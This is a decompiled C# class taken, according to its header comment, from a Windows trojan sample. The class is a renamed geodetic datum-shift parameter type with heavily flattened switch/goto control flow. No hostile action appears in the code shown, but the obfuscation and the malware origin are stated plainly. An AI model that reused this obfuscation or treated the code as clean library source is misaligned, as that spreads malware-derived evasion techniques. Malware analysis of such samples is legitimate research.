// Decompiled with JetBrains decompiler
// Type: ProjNet.Structs.AccountTokenStructBuilder
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using System;
using System.Globalization;
using System.Runtime.CompilerServices;
using TYPELIBA.Identifiers;

namespace ProjNet.Structs
{
  public class AccountTokenStructBuilder : IEquatable<AccountTokenStructBuilder>
  {
    public double m_Page;
    public double product;
    public double _Service;
    public double thread;
    public double m_Parameter;
    public double m_Base;
    public double m_Val;
    public string adapter;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public AccountTokenStructBuilder()
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      this.\u002Ector(0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, string.Empty);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public AccountTokenStructBuilder(
      double init,
      double vis,
      double temp,
      double selection2,
      double value3,
      double res4,
      double task5)
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      this.\u002Ector(init, vis, temp, selection2, value3, res4, task5, string.Empty);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public AccountTokenStructBuilder(
      double var1,
      double map,
      double rule,
      double t2,
      double selection3,
      double cfg4,
      double ivk5,
      string spec6)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              this.adapter = spec6;
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_8;
            case 1:
            case 2:
              goto label_2;
            case 3:
            case 6:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              goto label_8;
            case 7:
              goto label_10;
            default:
              goto label_6;
          }
        }
label_1:
        this.m_Parameter = selection3;
        this.m_Base = cfg4;
        this.m_Val = ivk5;
        num1 = 0;
        continue;
label_2:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        this.m_Page = var1;
        num1 = 4;
        continue;
label_3:
        this.product = map;
        this._Service = rule;
        this.thread = t2;
        goto label_1;
label_6:
        num1 = 6;
        continue;
label_8:
        ManagerParamsID.NewExpression();
        num1 = 2;
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal double[] FillProcess()
    {
      double num = 1.0 + this.m_Val * 1E-06;
      return new double[7]
      {
        num,
        this.thread * 4.84813681109536E-06 * num,
        this.m_Parameter * 4.84813681109536E-06 * num,
        this.m_Base * 4.84813681109536E-06 * num,
        this.m_Page,
        this.product,
        this._Service
      };
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string MapProcess() => string.Format((IFormatProvider) CultureInfo.InvariantCulture.NumberFormat, "TOWGS84[{0}, {1}, {2}, {3}, {4}, {5}, {6}]", (object) this.m_Page, (object) this.product, (object) this._Service, (object) this.thread, (object) this.m_Parameter, (object) this.m_Base, (object) this.m_Val);

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string PrepareProcess() => string.Format((IFormatProvider) CultureInfo.InvariantCulture.NumberFormat, "<CS_WGS84ConversionInfo Dx=\"{0}\" Dy=\"{1}\" Dz=\"{2}\" Ex=\"{3}\" Ey=\"{4}\" Ez=\"{5}\" Ppm=\"{6}\" />", (object) this.m_Page, (object) this.product, (object) this._Service, (object) this.thread, (object) this.m_Parameter, (object) this.m_Base, (object) this.m_Val);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override string ToString() => this.MapProcess();

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool RevertProcess()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              if (this.m_Page == 0.0)
              {
                num2 = 3;
                continue;
              }
              goto label_12;
            case 1:
            case 3:
              goto label_1;
            case 2:
              goto label_7;
            case 4:
              goto label_3;
            case 6:
              goto label_11;
            default:
              if (AccountTokenStructBuilder.QueryDescriptor())
              {
                num2 = 4;
                continue;
              }
              goto label_11;
          }
        }
label_1:
        if (this.product == 0.0 && this._Service == 0.0)
        {
          num1 = 2;
          continue;
        }
        goto label_12;
label_3:
        if (this.m_Parameter == 0.0 && this.m_Base == 0.0)
        {
          num1 = 6;
          continue;
        }
        goto label_12;
label_7:
        if (this.thread != 0.0)
          goto label_12;
        else
          goto label_3;
      }
label_11:
      int num3 = this.m_Val == 0.0 ? 1 : 0;
      goto label_13;
label_12:
      num3 = 0;
label_13:
      return num3 != 0;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override bool Equals(object v) => this.Equals(v as AccountTokenStructBuilder);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override int GetHashCode() => this.m_Page.GetHashCode() ^ this.product.GetHashCode() ^ this._Service.GetHashCode() ^ this.thread.GetHashCode() ^ this.m_Parameter.GetHashCode() ^ this.m_Base.GetHashCode() ^ this.m_Val.GetHashCode();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool Equals(AccountTokenStructBuilder i)
    {
      int num1 = 6;
      if (true)
        goto label_9;
label_1:
      if (i.m_Parameter == this.m_Parameter && i.m_Base == this.m_Base)
      {
        if (AccountTokenStructBuilder.QueryDescriptor())
          num1 = 7;
        else
          goto label_14;
      }
      else
        goto label_12;
label_9:
      bool flag1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            if (!flag1)
            {
              if (i.m_Page == this.m_Page && i.product == this.product && i._Service == this._Service && i.thread == this.thread)
              {
                num1 = 3;
                continue;
              }
              goto label_12;
            }
            else
            {
              if (AccountTokenStructBuilder.QueryDescriptor())
              {
                num1 = 4;
                continue;
              }
              goto label_8;
            }
          case 2:
          case 4:
            goto label_8;
          case 3:
            goto label_1;
          case 5:
            goto label_14;
          case 6:
            flag1 = i == null;
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto case 0;
          case 7:
            goto label_11;
          default:
            if (AccountTokenStructBuilder.QueryDescriptor())
            {
              num1 = 5;
              continue;
            }
            goto label_11;
        }
      }
label_8:
      bool flag2 = false;
      goto label_14;
label_11:
      int num2 = i.m_Val == this.m_Val ? 1 : 0;
      goto label_13;
label_12:
      num2 = 0;
label_13:
      flag2 = num2 != 0;
label_14:
      return flag2;
    }

    internal static bool QueryDescriptor() => true;

    internal static bool CheckDescriptor() => false;
  }
}
